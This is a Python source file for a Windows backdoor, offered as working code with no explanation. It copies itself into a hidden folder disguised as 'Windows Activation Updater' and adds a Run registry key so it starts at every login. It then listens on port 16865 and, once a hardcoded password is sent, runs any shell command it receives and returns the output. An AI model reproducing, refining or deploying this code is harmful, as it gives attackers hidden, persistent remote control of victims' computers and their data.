import socket
import os
from threading import Thread
from winreg import HKEY_CURRENT_USER, OpenKey, KEY_ALL_ACCESS, SetValueEx, REG_SZ, CloseKey
import sys
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 16865)) # Default port
s.listen(5)


def duplicate(path):
    abs_path = sys.argv[0]
    directory = ''
    element_list = list(path.split('\\'))
    length = len(element_list)
    for i in range(length):
        if not i == length - 1:
            directory += f'{element_list[i]}\\'
            directory = directory.replace('%USERPROFILE%', os.environ['USERPROFILE'])
            if not os.path.isdir(directory[0:-1]):
                os.system(f'mkdir "{directory[0:-1]}" && attrib +h "{directory[0:-1]}"')
    os.system(f'copy "{abs_path}" "{path}" && attrib +h "{path}"')


if not os.path.isfile(fr'{os.environ["USERPROFILE"]}\AppData\Local\Programs\Windows Activation Updater.exe'):
    duplicate(r'%USERPROFILE%\AppData\Local\Programs\Windows Activation Updater\Windows Activation Updater.exe')

reg_name = 'Windows Activation Updater'

key = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0, KEY_ALL_ACCESS)

SetValueEx(key, reg_name, 0, REG_SZ, fr'{os.environ["USERPROFILE"]}\AppData\Local\Programs\Windows Activation Updater\Windows Activation Updater.exe')
CloseKey(key)


def get_commands(admin):
    while True:
        try:
            cmd = admin.recv(1024).decode()
            output = os.popen(cmd).read()
            admin.send(output.encode())
            if cmd == b'':
                admin = wait_for_master()
        except:
            try:
                admin.send('[*] Error. Reconnect now.')
            except:
                pass
            admin = wait_for_master()


def wait_for_master():
    connected = False
    while not connected:
        master, ip = s.accept()
        connected = True
        if master.recv(1024).decode() != 'Dfjg8W$G*9gjH!': # Default password
            master.close()
            connected = False
    return master


commander = wait_for_master()
Thread(target=get_commands, args=(commander,)).start()
